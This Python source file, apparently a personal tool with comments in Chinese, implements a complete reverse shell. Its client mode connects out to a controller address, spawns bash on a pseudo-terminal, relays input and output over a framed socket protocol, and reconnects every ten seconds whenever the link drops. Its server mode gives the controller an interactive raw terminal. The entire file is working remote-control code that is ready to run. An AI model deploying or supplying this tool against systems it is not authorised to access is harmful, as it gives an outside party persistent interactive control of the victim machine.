#!/usr/bin/env python3
# coding=utf-8
# date 2022-01-12 15:44:57
# author calllivecn <c-all@qq.com>

"""
这里是使用反向shell连接到服务端的, Server是控制端，client是被控制端。
"""

import os
import io
import sys
import pty
import tty
import time
import enum
import fcntl
import socket
import struct
import signal
import logging
import termios
import argparse
import traceback
import threading
import selectors
from subprocess import Popen
from logging.handlers import TimedRotatingFileHandler


SHELL='bash'
STDIN = sys.stdin.fileno()
# STDIN = sys.stdin
STDOUT = sys.stdout.fileno()


def getlogger(level=logging.INFO):
    fmt = logging.Formatter("%(asctime)s %(levelname)s %(filename)s:%(funcName)s:%(lineno)d %(message)s", datefmt="%Y-%m-%d-%H:%M:%S")

    # stream = logging.StreamHandler(sys.stdout)
    # stream.setFormatter(fmt)

    # fp = logging.FileHandler("rshell.logs")
    fp = TimedRotatingFileHandler("rshell.logs", when="D", interval=1, backupCount=7)
    fp.setFormatter(fmt)

    logger = logging.getLogger("rshell")
    logger.setLevel(level)
    # logger.addHandler(stream)
    logger.addHandler(fp)
    return logger


logger = getlogger()


def get_pty_size(fd):
    size = fcntl.ioctl(fd, termios.TIOCGWINSZ, b"0000") # 占位符
    return struct.unpack("HH", size)

def set_pty_size(fd, columns, rows):
    size = struct.pack("HH", columns, rows)
    # 这个返回还知道是什么
    return fcntl.ioctl(fd, termios.TIOCSWINSZ, size)


# 窗口大小调整, 这样是调控制端的。
def signal_SIGWINCH_handle(sock, sigNum, frame):
    """
    usage: lambda sigNum, frame: signal_SIGWINCH_handle(sock, sigNum, frame)
    """
    size = get_pty_size(STDOUT)
    # logging 要异步的信号量模式下不安全。在 signal handle 里不要用 logging
    # logger.debug(f"窗口大小改变: {size}")
    # logger.debug("sigwinch 向对端发送新窗口大小")
    # set_pty_size(STDOUT, *size)
    sock.write(PacketType.TTY_RESIZE, struct.pack("!HH", *size))


class PacketType(enum.IntEnum):
    """
    一字节，数据包类型。
    """
    ZERO = 0 # 保留
    EXIT = enum.auto()
    TTY_RESIZE = enum.auto()
    TRANER = enum.auto()

class RecvSend:

    def __init__(self, sock):
        self.sock = sock
    
    def read(self):
        data = self.sock.recv(2)
        # 网络忙的时候，也有可能只recv()到一个字节。这里处理下
        if len(data) == 1:
            data+= self.sock.recv(1)
        
        if data == b"" or len(data) == 1:
            return PacketType.EXIT, b""

        size = int.from_bytes(data, "big")
        logger.debug(f"read() payload 长度 --> {size}")
        lenght = struct.unpack("!H", data)[0]
        payload = io.BytesIO()

        c = lenght
        while c > 0:
            d = self.sock.recv(c)

            if d == b"":
                logger.debug(f"peer close()")
                raise ValueError(f"peer close()")

            c -= len(d)

            payload.write(d)
        
        typ = payload.getvalue()[0]
        data = payload.getvalue()[1:]
        pt = PacketType(typ)
        logger.debug(f"sock recv --> type: {pt.name}, data: {data}")
        return typ, data
    
    def write(self, typ, data):
        data_len = len(data)
        if data_len > 65536:
            raise ValueError("数据包太大： 0 ~ 65536")

        payload = io.BytesIO()
        payload.write(struct.pack("!HB", data_len + 1, typ))

        payload.write(data)

        return self.sock.send(payload.getvalue())

    def fileno(self):
        return self.sock.fileno()

    def close(self):
        self.sock.close()



def socketshell(conn):
    try:
        env = os.environ.copy()
        pty_master, pty_slave = pty.openpty()

        ss = selectors.DefaultSelector()
        sock = RecvSend(conn)

        ss.register(pty_master, selectors.EVENT_READ)
        ss.register(sock, selectors.EVENT_READ)

        # 这两个种在linux上都可以,目前还没看出区别在哪。
        # p = Popen(SHELL.split(), stdin=pty_slave, stdout=pty_slave, stderr=pty_slave, preexec_fn=os.setsid, universal_newlines=True)
        p = Popen(SHELL.split(), stdin=pty_slave, stdout=pty_slave, stderr=pty_slave, preexec_fn=os.setsid)

        while p.poll() is None:
            for key, event in ss.select(0.05):
                if key.fileobj == sock:
                    typ, data = sock.read()
                    if typ == PacketType.TRANER:
                        os.write(pty_master, data)

                    elif typ == PacketType.EXIT:
                        # 正常退出，根本不会走到这个分支。
                        logger.debug(f"正常退出")
                        BREAK=True
                        break

                    elif typ == PacketType.TTY_RESIZE:
                        # 设置成对面终端大小
                        if len(data) == 4:
                            size = struct.unpack("!HH", data)
                            set_pty_size(pty_slave, *size)
                            logger.debug(f"接收到的终端大小: {size}")
                        else:
                            logger.debug(f"接收到的终端大小不正常: {data}")

                elif key.fileobj == pty_master:
                    data = os.read(pty_master, 4096)
                    logger.debug(f"pty_master read: {data}")
                    if data:
                        sock.write(PacketType.TRANER, data)
                    else:
                        # 正常退出，根本不会走到这个分支。
                        logger.debug(f"从 pty_master 读出了空字节")

    except Exception as e:
        # raise e
        logger.error(f"捕获到异常退出: {e}")
        # traceback.print_exc()
        logger.error(traceback.format_exc())

    finally:
        sock.close()
        ss.close()
        p.terminate()
        logger.info("sock exit")


def server(addr, port):
    server_addr = (addr, port)
    logger.info(f"{sys.argv[0]} listen: {server_addr}")

    try:

        sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        sock.bind(server_addr)
        sock.listen(5)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, True)

        client_sock, addr = sock.accept()
        # client_sock.setblocking(False)
        logger.info(f"有反向shell连接上: {addr}")

        client = RecvSend(client_sock)
        # 
        signal.signal(signal.SIGWINCH, lambda sig, frame: signal_SIGWINCH_handle(client, sig, frame))


        size = get_pty_size(STDIN)
        logger.info(f"向对面发送终端大小： {size}")

        n = client.write(PacketType.TTY_RESIZE, struct.pack("!HH", *size))
        logger.debug(f"初始化对面终端大小 时发送的数据量: {n} 字节")
    
        # 关闭监听
        logger.info(f"关闭监听")
        sock.close()

        # tty 
        tty_bak = termios.tcgetattr(STDIN)
        # tty.setraw(STDIN)
        # 根这样没有关系。。。
        tty.setraw(STDIN, termios.TCSADRAIN)

        ss = selectors.DefaultSelector()
        ss.register(client, selectors.EVENT_READ)
        ss.register(STDIN, selectors.EVENT_READ)

        exit_flag = True
        while exit_flag:

            for key, event in ss.select():

                if key.fileobj == client:

                    try:
                        typ, data = client.read()
                    except ValueError:
                        traceback.print_exc()
                        exit_flag = False
                        break

                    if typ == PacketType.TRANER:
                        os.write(STDOUT, data)

                    elif typ == PacketType.EXIT:
                        exit_flag = False
                        logger.debug(f"收到{PacketType.EXIT.name}")
                        break
                    
                    elif typ == PacketType.TTY_RESIZE:
                        # 控制端， 不会收到 被控端的 TTY_RESIZE
                        pass
                    else:
                        logger.error(f"未知的传输类型: {typ}")

                elif key.fileobj == STDIN:
                    data = os.read(STDIN, 4096)
                    if data == b"":
                        # 说明控制端， 主动退出？
                        logger.debug(f'os.read(STDIN) --> b""')
                        client.write(PacketType.EXIT, data)
                    else:
                        logger.debug(f"os.read(STDIN) --> {data}")
                        client.write(PacketType.TRANER, data)
            
        logger.debug(f"exit_flag: {exit_flag} 退出了")
    except Exception:
        traceback.print_exc()

    finally:
        client_sock.close()
        ss.close()
        termios.tcsetattr(STDIN, termios.TCSADRAIN, tty_bak)
        logger.info("logout")


def client(addr, port=6789):
    if addr == "":
        logger.info("client 需要 server 地址")
        return
    
    server_addr = (addr, port)

    while True:

        GO=False

        try:
            sock = socket.create_connection(server_addr, timeout=10)
        except TimeoutError:
            logger.info(f"连接超时。。。重新连接")
            GO=True
        except ConnectionRefusedError:
            logger.info(f"服务端口关闭，等待重新打开。。。")
            GO=True
        except socket.gaierror:
            logger.info(f"域名不存在")
            GO=True
        except Exception:
            traceback.print_exc()
            GO=True
        
        if GO:
            time.sleep(10)
            continue

        logger.info(f"client connect: {server_addr}")
        # sock.setblocking(False) # 又用同步的方式去使用，会报错误：BlockingIOError: [Errno 11] Resource temporarily unavailable
        th = threading.Thread(target=socketshell, args=(sock,), daemon=True)
        th.start()
        th.join()
        logger.info(f"连接 server: {server_addr}, socketshell 线程退出")
        time.sleep(10)


def main():
    parse = argparse.ArgumentParser(
        usage="%(prog)s <命令> [option]",
        description="反向shell连接",
        epilog="END",
    )

    # parse.add_argument("--client", action="store_true", help="使用client端")
    # parse.add_argument("--addr", default="", help="需要连接的IP或域名")
    # parse.add_argument("--port", default=6789, type=int, help="端口")

    subparsers = parse.add_subparsers(title="指令", metavar="")
    server_func =  subparsers.add_parser("server", help="启动服务端")
    client_func = subparsers.add_parser("client", help="使用client端")

    # server_func.add_argument("--cmd", default=SHELL, help=f"需要使用的交互程序(default: {SHELL})")
    server_func.add_argument("--addr", default="", help="需要连接的IP或域名")
    server_func.add_argument("--port", default=6789, type=int, help="端口")

    client_func.add_argument("--addr", default="", help="需要连接的IP或域名")
    client_func.add_argument("--port", default=6789, type=int, help="端口")

    parse.add_argument("--parse", action="store_true", help=argparse.SUPPRESS)

    parse.add_argument("--debug", action="store_true", help=argparse.SUPPRESS)

    server_func.set_defaults(func=lambda args :server(args.addr, args.port))
    
    client_func.set_defaults(func=lambda args :client(args.addr, args.port))

    args = parse.parse_args()

    if args.parse:
        logger.info(args)
        sys.exit(0)
    
    if args.debug:
        logger.setLevel(logging.DEBUG)
    
    try:
        return args.func(args)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
